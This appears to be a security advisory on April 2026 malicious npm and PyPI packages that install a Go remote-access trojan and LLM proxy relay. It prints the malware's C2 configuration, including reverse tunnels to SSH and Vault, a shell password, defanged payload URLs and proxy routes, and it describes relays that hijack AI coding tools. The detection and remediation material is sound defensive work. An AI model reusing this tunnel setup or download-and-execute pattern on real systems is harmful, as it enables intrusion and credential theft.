# GPT-Proxy Backdoor — kube-health-tools (npm) & kube-node-health (PyPI) Turn Servers into Chinese LLM Relays

**Date:** April 2026
**Ecosystem:** npm / PyPI
**Severity:** Critical
**Type:** Backdoor / RAT / LLM Proxy Relay
**Sources:**
- [Aikido — GPT-Proxy Backdoor in npm and PyPI turns Servers into Chinese LLM Relays](https://www.aikido.dev/blog/gpt-proxy-backdoor-npm-pypi-chinese-llm-relay)
- [Semgrep — Security Advisory: $foo compromised on $packagemanager](https://semgrep.dev/blog/2026/security-advisory-pgserve-xinference-kube-health)

---

## Summary

On April 22, 2026, Aikido Security discovered two malicious packages — `kube-health-tools` on npm and `kube-node-health` on PyPI — that use Kubernetes-themed names to appear legitimate while deploying a full remote access trojan and LLM proxy relay on compromised machines. Both packages target developers and organizations running Kubernetes workloads, where secrets stores like HashiCorp Vault and SSH access are common.

The attack is two-stage: a compiled native binary dropper (a `.node` Node.js addon for npm, a `.so` Cython extension for PyPI) downloads a Go-based stage-2 binary from GitHub and immediately executes it, then erases all evidence of the installation. The stage-2 binary establishes reverse tunnels back to the attacker's C2 server and deploys a fully functional OpenAI-compatible LLM proxy, allowing the attacker to route AI API traffic through the victim's machine as an unauthorized relay node in a commercial API-reselling operation.

The attack is linked to a Chinese threat actor ecosystem that monetizes compromised servers as proxy infrastructure — a recurring pattern driven by Great Firewall restrictions on AI model access. The same GitHub account (`gibunxi4201`) hosting the stage-2 payload has other proxy-related projects in its release history. Any developer whose AI coding tools route through a compromised relay is effectively passing their entire LLM context window (including API keys, system prompts, and code) through an adversary-controlled relay that can silently inject malicious tool calls or exfiltrate secrets.

---

## Compromised Artifacts

| Package | Registry | Malicious Version(s) | Notes |
|---------|----------|----------------------|-------|
| `kube-health-tools` | npm | All observed versions | Stage 1: `addon.node` dropper |
| `kube-node-health` | PyPI | All observed versions | Stage 1: `__init___cpython-311-x86_64-linux-gnu.so` dropper |

---

## How It Worked

### Stage 1 — Native Binary Droppers

Both packages ship a pre-compiled native binary as their primary payload carrier — no JavaScript or Python logic to inspect in the source:

- **npm (`kube-health-tools`):** `addon.node` — a Node.js native addon executed on `require()`
- **PyPI (`kube-node-health`):** `__init___cpython-311-x86_64-linux-gnu.so` — a Cython-compiled Python extension executed on `import`

Both droppers decode an XOR-encrypted configuration blob and download the stage-2 binary from GitHub:

```
# PyPI dropper fetches:
https://github[.]com/gibunxi4201/kube-node-diag/releases/download/v2[.]0/kube-diag-linux-amd64-packed

# npm dropper fetches a more capable variant:
https://github[.]com/gibunxi4201/kube-node-diag/releases/download/v2[.]0/kube-diag-full-linux-amd64-packed
```

The binary is written to `/tmp/.kh`, made executable, and launched with the XOR-decrypted config piped to stdin. Within 2 seconds of stage 2 starting, the dropper self-destructs: it deletes `/tmp/.kh`, `/tmp/.ns`, and recursively removes the entire `kube-health-tools` package from `node_modules`. A post-incident forensic scan of `node_modules` will find nothing.

### Stage 2 — Go RAT with Chisel Tunneling

The stage-2 binary is a compiled Go binary with multiple capabilities. It connects to the C2 server `sync[.]geeker[.]indevs[.]in` over WebSocket and uses the Chisel tunneling protocol to register reverse tunnels:

```json
{
  "server": "https://sync[.]geeker[.]indevs[.]in",
  "auth": "skywork:e5c2b988f369d9e51f30985eb8c1c5ae",
  "tunnels": [
    "R:4444:127.0.0.1:0",
    "R:4446:127.0.0.1:22",
    "R:4445:127.0.0.1:8200"
  ],
  "shell": { "enabled": true, "password": "123qweASD" },
  "disguise": { "process_name": "node-health-check", "argv": "--mode=daemon" }
}
```

The three tunnels expose to the attacker: the LLM proxy (port 4444), the victim's SSH server (port 4446), and HashiCorp Vault's default port (4445). The npm variant adds a **ngrok fallback**, cycling through a pool of ngrok accounts delivered by the C2 to maintain access even if the primary tunnel fails.

The binary includes: a SOCKS5 proxy, a reverse shell (password `123qweASD`), an SFTP server with full read/write filesystem access, and the OpenAI-compatible LLM proxy. It immediately renames its process to `node-health-check --mode=daemon` to blend into process listings, and purges all config-related environment variables from memory on startup.

### The LLM Proxy

The embedded proxy exposes four routes (`GET /health`, `GET /v1/models`, `POST /v1/chat/completions`, `POST /v1/completions`) and routes AI requests through attacker-controlled upstream aggregators rather than official provider APIs:

```
/gpt-proxy/shubiaobiao/chat/completions
/gpt-proxy/cloudsway/chat/completions
/gpt-proxy/aliyun/chat/completions
/gpt-proxy/volengine/chat/completions
/gpt-proxy/aws/claude/chat/completions
/gpt-proxy/azure/chat/completions
/gpt-proxy/deepseek/reasoner
```

The binary advertises 109 hardcoded model names spanning Anthropic, OpenAI, Google, ByteDance VolcEngine, and Alibaba. Anyone whose AI tools connect to the victim machine as an "OpenAI-compatible" endpoint is routing requests through an adversary-controlled relay with full visibility into every prompt, response, API key, and system prompt in transit.

---

## Timeline

| Date/Time (UTC) | Event |
|-----------------|-------|
| Apr 22, 2026 | Aikido Security discovers `kube-health-tools` (npm) and `kube-node-health` (PyPI) |
| Apr 22, 2026 | Aikido publishes full technical analysis with IOCs |
| Apr 22, 2026 | Semgrep publishes advisory covering the same packages alongside pgserve and xinference |

---

## Detection

```bash
# Check for the disguised process
ps aux | grep "node-health-check"
ps aux | grep "node-health-check --mode=daemon"

# Check for stage 1 dropper artifacts (likely already deleted by malware)
ls -la /tmp/.kh /tmp/.ns 2>/dev/null

# Check for the installed malicious packages
npm ls kube-health-tools 2>/dev/null
pip show kube-node-health 2>/dev/null

# Check for outbound connections to the C2 server
# Look for WebSocket connections to sync.geeker.indevs.in in network logs
ss -tnp | grep -E "443|4444|4445|4446"

# Check for ngrok processes (npm variant fallback)
ps aux | grep ngrok

# Verify file hashes for stage 1 droppers
# npm addon.node:
echo "5d58ce3119c37f2bd552f4d883a4f4896dfcb8fb04875f844f999497e4ca846d  addon.node" | sha256sum -c

# PyPI .so dropper:
echo "b3405b8456f4e82f192cdff6fdd5b290a58fafda01fbc08174105b922bd7b3cf  __init___cpython-311-x86_64-linux-gnu.so" | sha256sum -c

# Stage 2 binary (PyPI variant):
echo "fb3ae78d09c119ec335c3b99a95c97d9bb6f92fd2c7c9b0d3e875347e2f25bb2  kube-diag-linux-amd64-packed" | sha256sum -c

# Stage 2 binary (npm variant):
echo "3a3d8f8636fa1db21871005a49ecd7fa59688fa763622fa737ce6b899558b300  kube-diag-full-linux-amd64-packed" | sha256sum -c

# Check for reverse tunnel listener ports
netstat -tlnp 2>/dev/null | grep -E "4444|4445|4446"
```

---

## Remediation

1. **Remove the malicious packages** immediately:
   ```bash
   npm uninstall kube-health-tools
   pip uninstall kube-node-health -y
   ```
2. **Kill the implant process** if running:
   ```bash
   pkill -f "node-health-check"
   pkill -f "kube-diag"
   ```
3. **Remove any downloaded stage-2 binaries** (likely already self-deleted, but verify):
   ```bash
   rm -f /tmp/.kh /tmp/.ns
   ```
4. **Block or sinkhole** the C2 domain at the firewall/DNS level: `sync.geeker.indevs.in`
5. **Assume full credential compromise** — rotate all secrets accessible from the affected machine: SSH keys, Vault tokens, API keys for any AI providers (OpenAI, Anthropic, etc.), cloud credentials (AWS/GCP/Azure), npm tokens, and any secrets in environment variables.
6. **Review Vault audit logs** (port 8200 was tunneled) for unauthorized secret reads.
7. **Check AI tool configurations** — if any AI coding agent on the machine was configured to use a local or custom OpenAI-compatible endpoint, assume all prompts and responses were relayed through the attacker's infrastructure. Rotate any API keys observed in those sessions.
8. **Audit ngrok accounts** if the npm variant was installed — the attacker may have registered public tunnel endpoints exposing your services.

---

## Lessons Learned

- Native binaries (`.node` addons, Cython `.so` extensions) in packages bypass most source-code inspection tools; registry scanners must execute or emulate binaries to detect this class of threat
- The 2-second self-deletion window means forensic package scans will find no evidence of the malware after stage 2 is running — network and process monitoring is the only reliable detection path
- ICP (Internet Computer) and LLM proxy relay abuse represent a new monetization model for supply chain attackers — the goal is not just credential theft but turning compromised developer machines into billable AI relay infrastructure
- Any AI coding tool that uses a local or self-hosted "OpenAI-compatible" endpoint is a potential interception point; the proxy's ability to silently inject malicious tool calls into LLM responses is a novel and dangerous attack surface
- The Great Firewall restriction on AI model access creates sustained economic incentive to compromise developer machines as LLM relay nodes; this attack class will recur

---

## Related Incidents

- [CanisterWorm — TeamPCP npm Worm & Kubernetes Wiper](./2026-03-canisterworm-npm.md) — Earlier ICP canister C2 abuse in npm supply chain context
- [GlassWorm Native — Zig Dropper IDE Mass-Infection](./2026-04-glassworm-zig-dropper.md) — Contemporary native binary dropper attack on IDE extensions
- [@velora-dex/sdk — Registry-Only npm Backdoor](./2026-04-velora-dex-sdk-backdoor.md) — April 2026 npm backdoor with similar Kubernetes environment targeting
